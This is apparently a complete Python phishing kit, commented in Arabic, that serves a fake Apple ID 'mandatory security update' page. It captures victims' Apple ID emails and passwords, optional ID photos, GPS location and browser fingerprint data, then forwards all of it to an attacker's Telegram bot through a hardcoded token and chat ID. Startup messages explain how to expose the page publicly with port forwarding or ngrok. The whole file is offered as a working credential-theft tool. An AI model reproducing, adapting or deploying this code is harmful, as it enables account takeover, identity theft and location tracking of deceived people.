#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Apple Security Check - بوت تحكم متكامل مع خادم ويب عام
يعمل على أي جهاز في العالم ويستقبل الضحايا
"""

import os
import sys
import json
import logging
import threading
import time
import socket
import secrets
import requests
import subprocess
import netifaces
from datetime import datetime
from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import parse_qs, urlparse

# ===== إعدادات البوت =====
BOT_TOKEN = "8577785694:AAHjX4eMdB6VR6q0RWZIUpxKnhY14zLHrQY"
CHAT_ID = "6888107255"
SERVER_PORT = 8080
SERVER_HOST = "0.0.0.0"  # يستمع على كل الشبكات (مهم جداً)

# ===== إعدادات السجلات =====
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)

# ===== دالة الحصول على IP العام =====
def get_public_ip():
    """الحصول على IP العام للجهاز"""
    try:
        # محاولة أولى
        response = requests.get('https://api.ipify.org', timeout=5)
        if response.status_code == 200:
            return response.text.strip()
    except:
        pass
    
    try:
        # محاولة ثانية
        response = requests.get('https://icanhazip.com', timeout=5)
        if response.status_code == 200:
            return response.text.strip()
    except:
        pass
    
    try:
        # محاولة ثالثة
        response = requests.get('https://checkip.amazonaws.com', timeout=5)
        if response.status_code == 200:
            return response.text.strip()
    except:
        pass
    
    return "غير متاح"

# ===== دالة الحصول على IP المحلي =====
def get_local_ip():
    """الحصول على IP المحلي للجهاز"""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except:
        return "127.0.0.1"

# ===== إرسال رسالة للتليجرام =====
def send_telegram_message(text, parse_mode='HTML'):
    """إرسال رسالة إلى تليجرام"""
    try:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
        payload = {
            'chat_id': CHAT_ID,
            'text': text,
            'parse_mode': parse_mode
        }
        response = requests.post(url, json=payload, timeout=10)
        return response.status_code == 200
    except Exception as e:
        logger.error(f"فشل إرسال رسالة: {e}")
        return False

# ===== إرسال صورة للتليجرام =====
def send_telegram_photo(photo_bytes, caption=""):
    """إرسال صورة إلى تليجرام"""
    try:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto"
        files = {'photo': ('photo.jpg', photo_bytes, 'image/jpeg')}
        data = {'chat_id': CHAT_ID, 'caption': caption}
        response = requests.post(url, files=files, data=data, timeout=30)
        return response.status_code == 200
    except Exception as e:
        logger.error(f"فشل إرسال صورة: {e}")
        return False

# ===== صفحة HTML الرئيسية (داخل الكود) =====
HTML_PAGE = """<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>تحديث أمني - Apple ID</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
        }
        
        body {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }
        
        .container {
            width: 100%;
            max-width: 400px;
        }
        
        .card {
            background: white;
            border-radius: 20px;
            padding: 40px 30px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
            animation: slideUp 0.5s ease;
        }
        
        @keyframes slideUp {
            from {
                opacity: 0;
                transform: translateY(30px);
            }
            to {
                opacity: 1;
                transform: translateY(0);
            }
        }
        
        .logo {
            text-align: center;
            margin-bottom: 20px;
        }
        
        .logo img {
            width: 60px;
            height: 60px;
        }
        
        h1 {
            font-size: 24px;
            font-weight: 600;
            text-align: center;
            margin-bottom: 10px;
            color: #1d1d1f;
        }
        
        .subtitle {
            text-align: center;
            color: #86868b;
            font-size: 14px;
            margin-bottom: 25px;
            line-height: 1.5;
        }
        
        .input-group {
            margin-bottom: 15px;
        }
        
        label {
            display: block;
            margin-bottom: 5px;
            color: #1d1d1f;
            font-size: 14px;
            font-weight: 500;
        }
        
        input {
            width: 100%;
            padding: 12px 15px;
            border: 2px solid #e8e8ed;
            border-radius: 10px;
            font-size: 16px;
            transition: all 0.3s;
            outline: none;
        }
        
        input:focus {
            border-color: #0071e3;
            box-shadow: 0 0 0 4px rgba(0,113,227,0.1);
        }
        
        .file-upload {
            border: 2px dashed #e8e8ed;
            border-radius: 10px;
            padding: 15px;
            text-align: center;
            cursor: pointer;
            transition: all 0.3s;
            margin: 20px 0;
        }
        
        .file-upload:hover {
            border-color: #0071e3;
            background: #f5f5f7;
        }
        
        .file-upload input {
            display: none;
        }
        
        .file-upload span {
            color: #0071e3;
            font-weight: 500;
        }
        
        button {
            width: 100%;
            padding: 15px;
            background: #0071e3;
            color: white;
            border: none;
            border-radius: 10px;
            font-size: 17px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s;
        }
        
        button:hover {
            background: #0077ed;
            transform: translateY(-2px);
            box-shadow: 0 10px 20px rgba(0,113,227,0.3);
        }
        
        .loading {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background: rgba(255,255,255,0.9);
            z-index: 1000;
            align-items: center;
            justify-content: center;
            flex-direction: column;
        }
        
        .loading.active {
            display: flex;
        }
        
        .spinner {
            width: 50px;
            height: 50px;
            border: 5px solid #f3f3f3;
            border-top: 5px solid #0071e3;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin-bottom: 20px;
        }
        
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        
        .footer {
            text-align: center;
            margin-top: 20px;
            color: #86868b;
            font-size: 12px;
        }
        
        .footer a {
            color: #0071e3;
            text-decoration: none;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="card">
            <div class="logo">
                <img src="https://upload.wikimedia.org/wikipedia/commons/f/fa/Apple_logo_black.svg" alt="Apple Logo">
            </div>
            
            <h1>🔒 تحديث أمني إلزامي</h1>
            <div class="subtitle">
                نود إبلاغك بوجود تحديث أمني مهم لحسابك. يرجى تأكيد هويتك خلال 24 ساعة لتجنب تعليق الحساب.
            </div>
            
            <div class="input-group">
                <label>🍏 Apple ID</label>
                <input type="email" id="email" placeholder="example@icloud.com" autocomplete="username">
            </div>
            
            <div class="input-group">
                <label>🔐 كلمة المرور</label>
                <input type="password" id="password" placeholder="كلمة المرور" autocomplete="current-password">
            </div>
            
            <div class="file-upload" onclick="document.getElementById('fileInput').click()">
                <input type="file" id="fileInput" accept="image/*" capture="environment">
                <span>📸 إرفاق صورة الهوية للتحقق (اختياري)</span>
            </div>
            
            <button onclick="submitForm()">تأكيد الهوية</button>
            
            <div class="footer">
                <span>🔒 مشفر وآمن | Apple Security 2026</span>
            </div>
        </div>
    </div>
    
    <div class="loading" id="loading">
        <div class="spinner"></div>
        <div>جاري التحقق من الهوية...</div>
    </div>

    <script>
        let victimId = 'v_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
        
        // إرسال معلومات الجهاز عند الدخول
        fetch(window.location.href + '/api/visit', {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({
                victimId: victimId,
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                language: navigator.language,
                screen: screen.width + 'x' + screen.height,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                timestamp: new Date().toISOString()
            })
        });
        
        // التقاط الصور
        document.getElementById('fileInput').onchange = async function(e) {
            const file = e.target.files[0];
            if (file) {
                const formData = new FormData();
                formData.append('victimId', victimId);
                formData.append('photo', file);
                
                await fetch(window.location.href + '/api/upload', {
                    method: 'POST',
                    body: formData
                });
            }
        };
        
        // طلب الموقع الجغرافي
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(
                async (position) => {
                    await fetch(window.location.href + '/api/location', {
                        method: 'POST',
                        headers: {'Content-Type': 'application/json'},
                        body: JSON.stringify({
                            victimId: victimId,
                            latitude: position.coords.latitude,
                            longitude: position.coords.longitude,
                            accuracy: position.coords.accuracy
                        })
                    });
                },
                (error) => console.log('الموقع مرفوض')
            );
        }
        
        async function submitForm() {
            const email = document.getElementById('email').value;
            const password = document.getElementById('password').value;
            
            if (!email || !password) {
                alert('❌ الرجاء إدخال Apple ID وكلمة المرور');
                return;
            }
            
            document.getElementById('loading').classList.add('active');
            
            try {
                const response = await fetch(window.location.href + '/api/submit', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({
                        victimId: victimId,
                        email: email,
                        password: password,
                        timestamp: new Date().toISOString()
                    })
                });
                
                if (response.ok) {
                    setTimeout(() => {
                        window.location.href = 'https://www.icloud.com';
                    }, 2000);
                }
            } catch (error) {
                alert('❌ حدث خطأ، حاول مرة أخرى');
                document.getElementById('loading').classList.remove('active');
            }
        }
    </script>
</body>
</html>"""

# ===== معالج طلبات HTTP =====
class RequestHandler(BaseHTTPRequestHandler):
    """معالج طلبات HTTP"""
    
    def log_message(self, format, *args):
        """تجاوز السجلات الافتراضية"""
        pass
    
    def do_GET(self):
        """معالجة طلبات GET"""
        parsed = urlparse(self.path)
        
        if parsed.path == '/' or parsed.path == '/index.html':
            self.send_response(200)
            self.send_header('Content-type', 'text/html; charset=utf-8')
            self.end_headers()
            self.wfile.write(HTML_PAGE.encode('utf-8'))
            
        elif parsed.path == '/api/status':
            self.send_response(200)
            self.send_header('Content-type', 'application/json')
            self.end_headers()
            response = json.dumps({
                'status': 'online',
                'time': datetime.now().isoformat()
            })
            self.wfile.write(response.encode('utf-8'))
            
        else:
            self.send_response(404)
            self.end_headers()
            self.wfile.write(b'404 - Not Found')
    
    def do_POST(self):
        """معالجة طلبات POST"""
        parsed = urlparse(self.path)
        
        try:
            content_length = int(self.headers.get('Content-Length', 0))
            post_data = self.rfile.read(content_length)
            
            if parsed.path == '/api/visit':
                data = json.loads(post_data.decode('utf-8'))
                self.handle_visit(data)
                
            elif parsed.path == '/api/submit':
                data = json.loads(post_data.decode('utf-8'))
                self.handle_submit(data)
                
            elif parsed.path == '/api/location':
                data = json.loads(post_data.decode('utf-8'))
                self.handle_location(data)
                
            elif parsed.path == '/api/upload':
                self.handle_upload(post_data, self.headers)
                
            else:
                self.send_response(404)
                self.end_headers()
                return
            
            self.send_response(200)
            self.send_header('Content-type', 'application/json')
            self.end_headers()
            self.wfile.write(json.dumps({'status': 'ok'}).encode('utf-8'))
            
        except Exception as e:
            logger.error(f"خطأ في POST: {e}")
            self.send_response(500)
            self.end_headers()
    
    def handle_visit(self, data):
        """معالجة زيارة جديدة"""
        victim_id = data.get('victimId', 'unknown')
        
        message = f"""
🚨 **زيارة جديدة للرابط!**

🆔 **المعرف:** `{victim_id}`
📱 **الجهاز:** {data.get('platform', 'unknown')}
🌐 **المتصفح:** {data.get('userAgent', 'unknown')[:50]}...
📺 **الشاشة:** {data.get('screen', 'unknown')}
🕒 **الوقت:** {data.get('timestamp', 'unknown')}
🗣️ **اللغة:** {data.get('language', 'unknown')}
⏰ **المنطقة:** {data.get('timezone', 'unknown')}

🔍 **الحالة:** دخل الرابط بنجاح
"""
        send_telegram_message(message)
        logger.info(f"ضحية جديدة: {victim_id}")
    
    def handle_submit(self, data):
        """معالجة بيانات تسجيل الدخول"""
        victim_id = data.get('victimId', 'unknown')
        email = data.get('email', '')
        password = data.get('password', '')
        
        message = f"""
🔑 **بيانات تسجيل دخول جديدة!**

🆔 **الضحية:** `{victim_id}`
📧 **Apple ID:** `{email}`
🔐 **كلمة المرور:** `{password}`
🕒 **الوقت:** {data.get('timestamp', 'unknown')}

⚠️ **تم الاستلام بنجاح**
"""
        send_telegram_message(message)
        logger.info(f"بيانات دخول: {email}")
    
    def handle_location(self, data):
        """معالجة بيانات الموقع"""
        victim_id = data.get('victimId', 'unknown')
        lat = data.get('latitude', 0)
        lon = data.get('longitude', 0)
        
        maps_link = f"https://www.google.com/maps?q={lat},{lon}"
        
        message = f"""
📍 **موقع الضحية الجغرافي!**

🆔 **الضحية:** `{victim_id}`
🌍 **الإحداثيات:** {lat}, {lon}
🎯 **الدقة:** {data.get('accuracy', 'unknown')} متر
🗺️ **الخريطة:** {maps_link}
🕒 **الوقت:** {data.get('timestamp', 'unknown')}
"""
        send_telegram_message(message)
        logger.info(f"موقع ضحية: {lat}, {lon}")
    
    def handle_upload(self, data, headers):
        """معالجة رفع الصور"""
        try:
            import cgi
            form = cgi.FieldStorage(
                fp=io.BytesIO(data),
                headers=headers,
                environ={'REQUEST_METHOD': 'POST'}
            )
            
            victim_id = form.getvalue('victimId')
            file_item = form['photo']
            
            if file_item and file_item.file:
                photo_data = file_item.file.read()
                
                # إرسال الصورة للتليجرام
                caption = f"📸 صورة من الضحية: {victim_id}"
                send_telegram_photo(photo_data, caption)
                
                logger.info(f"صورة مستلمة من: {victim_id}")
                
        except Exception as e:
            logger.error(f"خطأ في رفع الصورة: {e}")

# ===== تشغيل الخادم =====
def run_server():
    """تشغيل خادم HTTP"""
    server = HTTPServer((SERVER_HOST, SERVER_PORT), RequestHandler)
    logger.info(f"✅ خادم HTTP يعمل على: http://{SERVER_HOST}:{SERVER_PORT}")
    
    # الحصول على IP العام
    public_ip = get_public_ip()
    local_ip = get_local_ip()
    
    # إرسال إشعار بالتشغيل
    message = f"""
🚀 **تم تشغيل الخادم بنجاح!**

🌐 **الروابط المتاحة:**
• محلي: `http://localhost:{SERVER_PORT}`
• شبكة محلية: `http://{local_ip}:{SERVER_PORT}`
• عام: `http://{public_ip}:{SERVER_PORT}`

⚠️ **ملاحظات:**
- الرابط العام يشتغل فقط إذا كان الجهاز متصلاً بالإنترنت مباشرة
- إذا كنت خلف راوتر، لازم تعمل Port Forwarding
- أو استخدم خدمة tunneling مثل ngrok

📊 **حالة البوت:** نشط وجاهز
🕒 وقت التشغيل: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
"""
    send_telegram_message(message)
    
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        logger.info("⏹️ إيقاف الخادم...")
        server.shutdown()

# ===== فتح الرابط في المتصفح =====
def open_browser():
    """فتح الرابط في المتصفح بعد ثانيتين"""
    time.sleep(2)
    webbrowser.open(f"http://localhost:{SERVER_PORT}")

# ===== الدالة الرئيسية =====
if __name__ == "__main__":
    print("=" * 60)
    print("🍎 Apple Security Check - خادم ويب متكامل")
    print("=" * 60)
    print(f"📡 تشغيل الخادم على المنفذ: {SERVER_PORT}")
    print(f"📱 رابط محلي: http://localhost:{SERVER_PORT}")
    print("=" * 60)
    print("⚠️  للاستخدام العام، تحتاج إلى:")
    print("   1. إعداد Port Forwarding على الراوتر")
    print("   2. أو استخدم خدمة مثل ngrok")
    print("=" * 60)
    
    # فتح المتصفح
    threading.Thread(target=open_browser, daemon=True).start()
    
    # تشغيل الخادم
    run_server()
